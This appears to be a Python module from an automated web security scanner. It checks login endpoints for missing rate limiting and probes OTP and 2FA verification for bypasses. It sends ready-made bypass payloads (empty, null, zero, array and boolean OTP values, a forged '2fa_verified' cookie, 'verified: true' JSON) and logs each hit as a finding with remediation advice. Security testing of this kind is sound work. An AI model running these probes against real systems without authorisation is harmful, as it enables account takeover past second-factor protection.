"""
Rate Limiting, OTP/2FA Bypass detection agent
"""

import asyncio
import time
from typing import List
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class RateLimitAgent(BaseAgent):
    """Agent for detecting rate limiting and OTP/2FA bypass issues"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("Rate Limit Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.login_paths = ["/login", "/api/login", "/auth", "/auth/login", "/api/auth"]
        self.otp_paths = ["/verify-otp", "/verify-2fa", "/2fa", "/otp", "/api/verify-otp",
                          "/mfa", "/verify-mfa", "/api/2fa", "/api/mfa"]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")
        await self._test_rate_limiting_login()
        await self._test_otp_bypass()
        await self._test_2fa_bypass()
        await self._run_nuclei_tags(tags=["rate-limit", "rate-limiting", "otp-bypass", "2fa-bypass"], severity="medium")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_rate_limiting_login(self) -> None:
        async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                for path in self.login_paths:
                    login_url = url.rstrip("/") + path
                    try:
                        response = await client.get(login_url, timeout=5)
                        if response.status_code >= 400:
                            continue
                    except Exception:
                        continue

                    start = time.time()
                    status_codes = []
                    for i in range(12):
                        try:
                            data = {"username": f"test{i}@test.com", "password": "wrongpass"}
                            r = await client.post(login_url, data=data, timeout=5)
                            status_codes.append(r.status_code)
                        except Exception:
                            status_codes.append(0)

                    duration = time.time() - start
                    unique_codes = len(set(status_codes))
                    all_same = len(set(status_codes)) <= 2 and all(s == status_codes[0] for s in status_codes)

                    if all_same and status_codes[0] in [200, 302, 303, 401, 403]:
                        if len(status_codes) >= 10 and duration < 15:
                            self.add_finding(Finding(
                                title="Missing Rate Limiting on Login",
                                description=f"No rate limiting detected on {login_url}. All {len(status_codes)} requests returned same status.",
                                severity="high",
                                category="authentication",
                                evidence=f"{len(status_codes)} rapid requests ({duration:.1f}s) all returned HTTP {status_codes[0]}",
                                proof_of_concept=f"POST {login_url} with 12 rapid successive attempts",
                                remediation="Implement rate limiting (e.g., 5 attempts per minute). Add CAPTCHA after failed attempts.",
                                confidence=0.9,
                            ))
                            break
                    elif all_same and duration < 5:
                        self.add_finding(Finding(
                            title="Weak Rate Limiting on Login",
                            description=f"Rate limiting may be insufficient. {len(status_codes)} requests completed in {duration:.1f}s",
                            severity="medium",
                            category="authentication",
                            evidence=f"Requests completed quickly: {duration:.1f}s for {len(status_codes)} attempts",
                            remediation="Strengthen rate limiting. Consider account lockout after threshold.",
                            confidence=0.7,
                        ))
                    break

    async def _test_otp_bypass(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                for path in self.otp_paths:
                    otp_url = url.rstrip("/") + path
                    bypass_techniques = [
                        {"name": "empty_otp", "data": {"otp": "", "code": ""}},
                        {"name": "null_otp", "data": {"otp": "null", "code": "null"}},
                        {"name": "zero_otp", "data": {"otp": "0", "code": "0"}},
                        {"name": "array_otp", "data": {"otp[]": "123456", "code[]": "123456"}},
                        {"name": "true_otp", "data": {"otp": True, "code": True}},
                    ]

                    for technique in bypass_techniques:
                        try:
                            response = await client.post(otp_url, data=technique["data"])
                            if self._detect_bypass(response):
                                self.add_finding(Finding(
                                    title=f"OTP Bypass via {technique['name']}",
                                    description=f"OTP verification bypassed using {technique['name']} technique",
                                    severity="critical",
                                    category="authentication",
                                    evidence=f"Bypass with {technique['data']}. HTTP {response.status_code}",
                                    proof_of_concept=f"POST {otp_url} with data: {technique['data']}",
                                    remediation="Validate OTP server-side. Do not accept empty/null values. Rate limit OTP attempts.",
                                    confidence=0.85,
                                ))
                                break
                        except Exception as e:
                            logger.debug(f"Error testing OTP bypass: {e}")

                    try:
                        response = await client.get(otp_url)
                        if response.status_code < 400:
                            pass
                    except Exception:
                        pass

    async def _test_2fa_bypass(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                bypass_methods = [
                    {"name": "remove_2fa_param", "path": "/dashboard", "remove": True},
                    {"name": "response_manipulation", "path": "/2fa", "cookies": {"2fa_verified": "true"}},
                    {"name": "boolean_bypass", "path": "/api/verify-2fa", "json": {"verified": True}},
                    {"name": "status_code_bypass", "path": "/api/2fa", "data": {"2fa_complete": "1"}},
                ]

                for method in bypass_methods:
                    try:
                        path = method["path"]
                        full_url = url.rstrip("/") + path

                        if "cookies" in method:
                            response = await client.get(full_url, cookies=method["cookies"])
                        elif "json" in method:
                            response = await client.post(full_url, json=method["json"])
                        elif "data" in method:
                            response = await client.post(full_url, data=method["data"])
                        else:
                            response = await client.get(full_url)

                        if self._detect_bypass(response):
                            self.add_finding(Finding(
                                title=f"2FA Bypass via {method['name']}",
                                description=f"Two-factor authentication bypassed using {method['name']}",
                                severity="critical",
                                category="authentication",
                                evidence=f"Bypass technique: {method['name']}. HTTP {response.status_code}",
                                proof_of_concept=f"Method: {method['name']} on {full_url}",
                                remediation="Enforce 2FA server-side. Validate verification on every sensitive action.",
                                confidence=0.8,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing 2FA bypass: {e}")

    def _detect_bypass(self, response: httpx.Response) -> bool:
        if response.status_code in [200, 302, 303]:
            body_lower = response.text.lower()
            success = any(i in body_lower for i in [
                "dashboard", "welcome", "logged in", "authenticated",
                "profile", "logout", "verified",
            ])
            return success
        return False
